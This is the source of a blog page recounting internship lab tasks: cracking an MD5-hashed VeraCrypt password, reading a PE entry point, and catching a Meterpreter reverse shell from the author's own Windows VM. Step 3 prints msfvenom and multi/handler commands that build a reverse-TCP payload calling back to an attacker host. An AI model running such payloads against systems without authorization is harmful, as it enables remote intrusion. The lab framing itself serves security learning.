import WriteupArticle from "../../components/WriteupArticle";
import Reveal from "../../components/Reveal";
import GlowDivider from "../../components/GlowDivider";

export const metadata = {
  description: "ShadowFox intermediate labs, April 2026. A VeraCrypt password cracked from its MD5, a PE entry point, and a Metasploit reverse shell on my own Windows VM.",
  title: "VeraCrypt, PE analysis, and Metasploit | hannan.",
};

function Step({ number, title, children }) {
  return (
    <Reveal tag="section" className="py-8">
      <p className="text-[11px] font-bold uppercase tracking-[0.28em] text-[#8A8A8A]">Step {number}</p>
      <h2 className="mt-3 text-xl text-[#F5F2ED] sm:text-2xl">{title}</h2>
      <div className="mt-4 space-y-4 text-sm leading-relaxed text-[#F5F2ED]">{children}</div>
    </Reveal>
  );
}

function Code({ children }) {
  return (
    <pre className="overflow-x-auto rounded-xl border border-[#262626] bg-[#111111] p-4 font-mono text-sm leading-relaxed text-[#F5F2ED]">
      <code>{children}</code>
    </pre>
  );
}

function Shot({ src, alt, caption }) {
  return (
    <figure className="mt-6">
      <img src={src} alt={alt} className="w-full rounded-xl border border-[#262626]" loading="lazy" />
      <figcaption className="mt-3 text-sm text-[#8A8A8A]">{caption}</figcaption>
    </figure>
  );
}

export default function VeracryptPeMetasploit() {
  return (
    <WriteupArticle
      title="VeraCrypt, PE analysis, and Metasploit"
      date="30 April 2026"
      category="Lab notes"
      readingTime="5 min read"
    >
      <p>
        These are the intermediate tasks from my ShadowFox cyber security internship, April 2026. Three
        separate mini labs, not one chain: crack a password to open an encrypted file, read the headers
        of a Windows program, and get a reverse shell from my own Windows virtual machine. All of it
        happened in the last week of April 2026.
      </p>

      <GlowDivider />

      <Step number="1" title="VeraCrypt password, cracked from its MD5">
        <p>
          The task gave me an encrypted VeraCrypt file and a text file with the password in hash form.
          The hash was 482c811da5d5b4bc6d497ffa98491e38, and it is an MD5. I put it into CrackStation, and
          it came back as password123. With that password, the volume mounted in VeraCrypt, and the text
          file inside it read: the secret code is, never giveup.
        </p>
        <Code>{`482c811da5d5b4bc6d497ffa98491e38
MD5 -> password123`}</Code>
        <p>
          That is the whole lesson. MD5 is fast to crack, and password123 is one of the most common
          passwords there is, so the encryption never stood a chance. A long, unique passphrase is what
          makes an encrypted volume actually hard to open.
        </p>
        <Shot
          src="/writeups/intermediate/04-crackstation-md5.jpg"
          alt="CrackStation result for the MD5 hash, showing password123"
          caption="CrackStation. Hash 482c811da5d5b4bc6d497ffa98491e38, type MD5, result password123."
        />
        <Shot
          src="/writeups/intermediate/05-veracrypt-secret-code.jpg"
          alt="VeraCrypt volume mounted, with a text file reading the secret code is never giveup"
          caption="The volume mounted in VeraCrypt. The text file inside reads: The secret code is:- never giveup."
        />
      </Step>

      <GlowDivider />

      <Step number="2" title="PE Explorer, the entry point of VeraCrypt Setup">
        <p>
          Next I opened VeraCrypt Setup 1.26.7.exe in PE Explorer and read its headers. The field I was
          asked for was the Address of Entry Point, and it is 00423780h. That is the address where the
          program starts running when Windows loads it.
        </p>
        <Code>{`VeraCrypt Setup 1.26.7.exe
Address of Entry Point: 00423780h
Image Base: 00400000h, PE32`}</Code>
        <p>
          This step was analysis, not a vulnerability. No bug here, just reading the file to understand
          it. Knowing where a program starts is useful when you later look at what it actually does.
        </p>
        <Shot
          src="/writeups/intermediate/06-pe-explorer-entry-point.jpg"
          alt="PE Explorer headers for VeraCrypt Setup 1.26.7, Address of Entry Point 00423780h highlighted"
          caption="PE Explorer, 28 April 18:57. Address of Entry Point 00423780h, highlighted."
        />
      </Step>

      <GlowDivider />

      <Step number="3" title="Metasploit reverse shell, my own Windows VM">
        <p>
          Last, I built a payload with msfvenom and caught the reverse shell with Metasploit. The target
          was my own Windows 10 virtual machine on my own network, nothing else. The payload was a
          Meterpreter reverse TCP shell, and the handler listened on port 4444.
        </p>
        <Code>{`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=4444 -f exe > shell.exe
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <Your_IP>
set LPORT 4444
exploit`}</Code>
        <p>
          I do not have a screenshot of the msfvenom step itself, only the handler. The handler worked:
          Meterpreter session 1 opened at 15:06:30 on 30 April, from the Windows VM at 192.168.0.101.
          The sysinfo showed DESKTOP-5FAD4RQ, Windows 10 22H2, and the session user was sfmod.
        </p>
        <Shot
          src="/writeups/intermediate/07-metasploit-handler.jpg"
          alt="Metasploit handler showing Meterpreter session 1 opened from the Windows VM"
          caption="Metasploit, 30 April 15:06:30. Meterpreter session 1 opened, DESKTOP-5FAD4RQ, Windows 10 22H2, user sfmod."
        />
        <p>
          The lesson is simple and a bit scary: an unsigned exe, run once, gave a full shell back to
          the attacker machine. On a real machine, that is why you do not run files you did not ask for,
          and why application allowlisting and endpoint protection exist.
        </p>
      </Step>

      <GlowDivider />

      <p className="text-sm text-[#8A8A8A]">
        Done during the ShadowFox Cyber Security Virtual Internship, 1 to 30 April 2026. Cert ID SFO4VIP284.
      </p>
      <p>
        <a href="/writeups" className="font-semibold text-[#F5F2ED] underline underline-offset-4">
          Back to Writeups
        </a>
      </p>
    </WriteupArticle>
  );
}
